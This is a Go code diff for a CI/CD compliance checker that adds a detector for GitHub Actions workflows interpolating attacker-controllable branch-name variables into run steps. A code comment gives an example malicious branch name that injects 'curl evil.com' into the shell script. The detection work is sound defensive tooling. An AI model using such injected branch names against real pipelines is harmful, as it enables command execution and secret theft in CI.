@@ -34,9 +34,23 @@ var untrustedVarsRegex = `.*(github\.event\.issue\.title|` +
 	`github\.event\.pull_request\.head\.repo\.default_branch|` +
 	`github\.head_ref).*`
 
-func CicdSanitizedInputParameters(payloadData any) (result gemara.Result, message string, confidence gemara.ConfidenceLevel) {
+// Branch name variables that could be used unsafely in workflow run steps.
+// These are attacker-controllable when a PR is opened from a fork.
+// When used directly in a run: step, GitHub textually injects the branch name
+// into the shell script before execution, allowing command injection via
+// a malicious branch name (e.g. a branch named: feature"; curl evil.com; echo ").
+var branchNameVarsRegex = `.*(github\.head_ref|` +
+	`github\.base_ref|` +
+	`github\.ref\b|` +
+	`github\.ref_name|` +
+	`github\.event\.pull_request\.head\.ref|` +
+	`github\.event\.pull_request\.base\.ref).*`
 
-	// parse the payload and see if we pass our checks
+// checkAllWorkflows verifies the payload, iterates over all workflow files, and
+// applies checkWorkflow to each parsed workflow. passMessage is returned when all files pass.
+func checkAllWorkflows(payloadData any, checkWorkflow func(*actionlint.Workflow) (bool, string), passMessage string) (gemara.Result, string, gemara.ConfidenceLevel) {
+	var confidence gemara.ConfidenceLevel
+
 	data, message := reusable_steps.VerifyPayload(payloadData)
 	if message != "" {
 		return gemara.Unknown, message, confidence
@@ -70,16 +84,59 @@ func CicdSanitizedInputParameters(payloadData any) (result gemara.Result, messag
 			return gemara.Failed, fmt.Sprintf("Error parsing workflow: %v (%s)", actionError, *file.Path), confidence
 		}
 
-		// Check the workflow for untrusted inputs
-		ok, message := checkWorkflowFileForUntrustedInputs(workflow)
-
+		ok, message := checkWorkflow(workflow)
 		if !ok {
 			return gemara.Failed, message, confidence
 		}
 	}
 
-	return gemara.Passed, "GitHub Workflows variables do not contain untrusted inputs", confidence
+	return gemara.Passed, passMessage, confidence
+}
 
+func CicdSanitizedInputParameters(payloadData any) (gemara.Result, string, gemara.ConfidenceLevel) {
+	return checkAllWorkflows(payloadData, checkWorkflowFileForUntrustedInputs,
+		"GitHub Workflows variables do not contain untrusted inputs")
+}
+
+func CicdBranchNameSanitized(payloadData any) (gemara.Result, string, gemara.ConfidenceLevel) {
+	return checkAllWorkflows(payloadData, checkWorkflowFileForBranchNameUsage,
+		"GitHub Workflows do not use unsanitized branch names in run steps")
+}
+
+func checkWorkflowFileForBranchNameUsage(workflow *actionlint.Workflow) (bool, string) {
+
+	branchNameVars, _ := regexp.Compile(branchNameVarsRegex)
+	var message strings.Builder
+
+	for _, job := range workflow.Jobs {
+		if job == nil {
+			continue
+		}
+
+		for _, step := range job.Steps {
+			if step == nil {
+				continue
+			}
+
+			run, ok := step.Exec.(*actionlint.ExecRun)
+			if !ok || run.Run == nil {
+				continue
+			}
+
+			varList := pullVariablesFromScript(run.Run.Value)
+
+			for _, name := range varList {
+				if branchNameVars.Match([]byte(name)) {
+					message.WriteString(fmt.Sprintf("Unsanitized branch name variable found: %v\n", name))
+				}
+			}
+		}
+	}
+
+	if message.Len() > 0 {
+		return false, message.String()
+	}
+	return true, ""
 }
 
 func checkWorkflowFileForUntrustedInputs(workflow *actionlint.Workflow) (bool, string) {
@@ -123,28 +180,25 @@ func checkWorkflowFileForUntrustedInputs(workflow *actionlint.Workflow) (bool, s
 
 }
 
+// pullVariablesFromScript extracts GitHub Actions expression names from a shell script.
+// It finds all ${{ ... }} interpolations and returns the trimmed variable names.
+// For example, given `echo ${{ github.head_ref }}`, it returns ["github.head_ref"].
 func pullVariablesFromScript(script string) []string {
 
 	varlist := []string{}
 
 	for {
 
-		//strings.Inex returns the first instance of a string
-		//if the string is not found it returns -1 indicating the end of the scan
-		//if the string is found it returns the index of the first character of the string
 		start := strings.Index(script, "${{")
 		if start == -1 {
 			break
 		}
 
-		//Scanning a new slice gives us the length of the varialbe at the index of the closing bracket
 		len := strings.Index(script[start:], "}}")
 		if len == -1 {
-			//script is malformed somehow
 			return nil
 		}
 
-		//Create a new slice starting at the first character after the opening bracket of len
 		varlist = append(varlist, strings.TrimSpace(script[start+3:start+len]))
 
 		script = script[start+len:]
